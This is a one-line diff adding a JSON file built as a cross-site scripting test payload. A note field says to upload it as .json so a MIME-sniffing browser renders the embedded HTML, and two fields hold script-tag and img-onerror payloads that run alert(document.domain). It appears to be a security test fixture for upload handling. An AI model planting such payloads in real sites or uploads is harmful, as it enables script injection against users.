@@ -1,0 +1,1 @@
+{"note":"upload as .json; if the server returns it with text/html (or no/ignored content-type) an MIME-sniffing browser renders the HTML below","xss":"<script>alert(document.domain)</script>","img":"<img src=x onerror=alert(document.domain)>"}
